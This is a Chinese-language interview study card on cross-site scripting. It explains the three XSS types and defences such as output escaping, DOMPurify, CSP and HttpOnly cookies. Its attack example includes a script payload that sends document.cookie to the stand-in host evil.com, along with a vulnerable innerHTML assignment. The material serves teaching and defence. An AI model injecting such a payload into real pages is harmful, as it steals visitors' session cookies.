# N6 · XSS 跨站脚本攻击

> 热度:🔥🔥🔥

## 一句话考点

XSS(跨站脚本)是攻击者往页面**注入恶意脚本**并在受害者浏览器执行,窃取 cookie/token 或冒充操作;核心防御是**输入过滤 + 输出转义 + CSP**。

## 原理精讲

### 1. 三种 XSS 类型

| 类型 | 原理 | 场景 |
|------|------|------|
| **存储型** | 恶意脚本存入数据库,其他用户访问时执行 | 评论区、留言板(危害最大,影响所有访问者) |
| **反射型** | 脚本在 URL 参数中,服务器"反射"回页面执行 | 恶意链接(需诱导点击) |
| **DOM 型** | 前端 JS 直接把不可信数据写入 DOM,不经过服务器 | `innerHTML`、`location` 等前端操作 |

### 2. 攻击示例

```js
// 用户提交的评论内容:
<script>fetch('http://evil.com?c=' + document.cookie)</script>

// 若网站直接把评论用 innerHTML 渲染,脚本就会执行,cookie 被窃取
commentEl.innerHTML = userComment;   // ❌ 危险
```

### 3. 防御手段

**① 输出转义(最核心)**
把 `< > & " '` 等转成 HTML 实体,让内容作为文本而非代码渲染。现代框架(React/Vue)默认转义 `{{ }}` / `{}` 插值。

**② 避免危险 API**
- 慎用 `innerHTML`、`document.write`、`eval`、`v-html`、`dangerouslySetInnerHTML`;
- 必须用时先用 **DOMPurify** 等库净化。

**③ CSP(内容安全策略)**
通过响应头限制脚本来源,即使注入了脚本也不执行:
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

**④ HttpOnly Cookie**
给 cookie 设 `HttpOnly`,禁止 JS 读取 `document.cookie`,即使 XSS 也偷不到。

**⑤ 输入校验**
对输入做白名单校验和长度限制(辅助手段,不能替代输出转义)。

## 代码示例

```js
// 手写 HTML 转义
function escapeHtml(str) {
  return str.replace(/[&<>"']/g, (c) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;',
    '"': '&quot;', "'": '&#39;',
  }[c]));
}

// 用 DOMPurify 净化富文本
import DOMPurify from 'dompurify';
el.innerHTML = DOMPurify.sanitize(userInput);   // ✅ 过滤恶意标签/属性

// React 中(默认安全)
<div>{userInput}</div>                 // ✅ 自动转义
<div dangerouslySetInnerHTML={{ __html: userInput }} />  // ❌ 除非已净化
```

## 高频追问

**Q:XSS 有哪几种?区别?**
A:存储型(脚本存服务器,访问即中招,危害最广)、反射型(脚本在 URL,服务器反射回来,需诱导点击)、DOM 型(前端 JS 把不可信数据写入 DOM,不经服务器)。

**Q:XSS 最有效的防御是什么?**
A:输出转义——对用户内容做 HTML 实体编码,让它作为文本渲染而非执行。配合 CSP、HttpOnly cookie、避免 innerHTML/eval、富文本用 DOMPurify 净化。

**Q:HttpOnly 能防 XSS 吗?**
A:不能阻止 XSS 发生,但能降低危害——设了 HttpOnly 的 cookie 无法被 JS 读取,攻击者即使注入脚本也偷不到该 cookie,保护会话凭证。

**Q:CSP 是什么?怎么防 XSS?**
A:内容安全策略,通过响应头白名单限制资源(尤其脚本)的来源和内联脚本执行。即便页面被注入了恶意 script,不符合策略也不会执行,是纵深防御的重要一层。

**Q:React/Vue 默认防 XSS 吗?什么情况会破防?**
A:默认对插值内容转义,较安全。破防点:React 的 `dangerouslySetInnerHTML`、Vue 的 `v-html`、直接操作 DOM 的 innerHTML、拼接 href="javascript:" 等,需手动净化。

## 一句话背诵版

**XSS = 注入恶意脚本在受害者浏览器执行,分存储型/反射型/DOM 型;核心防御是输出转义(HTML 实体编码),辅以 CSP 白名单、HttpOnly cookie、避免 innerHTML/eval/v-html、富文本用 DOMPurify 净化;框架默认转义但 v-html/dangerouslySetInnerHTML 会破防。**
